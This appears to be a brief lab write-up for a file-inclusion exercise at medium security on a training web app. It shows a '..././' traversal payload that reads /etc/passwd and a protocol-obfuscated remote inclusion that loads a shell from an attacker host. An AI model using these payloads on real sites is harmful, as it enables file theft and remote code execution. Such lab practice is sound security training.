📂 File Inclusion – Medium Security Level

### 🛠️ Objective:
Bypass basic filters to achieve LFI and possibly RFI.

---

### 🔒 What's Different?

In the source code, input to the `page` parameter is filtered:
- Replaces all occurrences of `../` and `..\` with an empty string

---

### 🧭 Bypassing Filter

Use a trick like `..././` to avoid exact match of `../`:
```bash
page=..././..././..././..././etc/passwd
````

✅ This bypasses the filter and successfully includes `/etc/passwd`.

> 🎯 The string `..././` avoids the exact pattern `../` but still traverses directories.

---

### 🌐 Remote File Inclusion Bypass

To bypass `http` filters, obfuscate the protocol:

```bash
page=hthttp://tp://your-ip/shell.txt
```

Or use other encoding tricks depending on the environment.

---

### 🧩 Summary

* ⚠️ LFI and RFI still possible with obfuscation
* 🚫 Basic filter in place, but not effective

## ✅ Status

* ⚠️ Still exploitable with slight tricks
* 🟡 Requires intermediate techniques
